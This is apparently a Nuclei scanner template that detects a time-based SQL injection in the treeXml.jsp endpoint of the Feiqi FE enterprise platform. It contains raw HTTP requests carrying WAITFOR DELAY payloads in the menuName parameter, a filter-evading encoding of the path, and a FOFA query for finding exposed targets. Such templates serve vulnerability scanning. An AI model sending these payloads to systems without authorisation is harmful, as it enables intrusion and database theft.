id: FE-treeXml-sql-injection

info:
  name: 飞企互联-FE企业运营管理平台 treeXml.jsp SQL延时注入漏洞
  author: unknown
  severity: high
  description: |-
    fofa: app="FE-协作平台"
    飞企互联-FE企业运营管理平台 treeXmljsp 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139577101
  tags: sql injection

http:
  - raw:
      - |
        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:3'--&type=function HTTP/1.1 
        Host: {{Hostname}}

      - |
        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:6'--&type=function HTTP/1.1 
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
            - 'duration_1>=3 && duration_1<=4'  
            - 'duration_2>=6 && duration_2<=7'  
      - type: status
        status: 
          - 200